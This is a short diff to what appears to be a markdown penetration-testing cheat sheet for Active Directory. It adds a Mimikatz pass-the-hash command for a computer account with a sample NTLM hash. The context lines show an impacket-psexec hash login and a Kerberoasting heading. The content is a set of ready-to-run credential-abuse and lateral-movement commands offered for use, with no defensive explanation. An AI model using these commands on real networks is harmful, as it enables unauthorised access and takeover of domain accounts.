@@ -93,6 +93,16 @@ impacket-psexec Administrator:@192.168.199.59 -hashes aad3b435b51404eeaad3b435b5
 
 <details>
 
+<summary>Pass the Hash with Computer Account</summary>
+
+```bash
+sekurlsa::pth /user:web01$ /domain:EVIL.COM /ntlm:f4528218862ef1bed4c351d7b10d77fd
+```
+
+</details>
+
+<details>
+
 <summary>Kerberoasting</summary>
 
 To obtain TGS-REP hash to crack service accounts passwords.
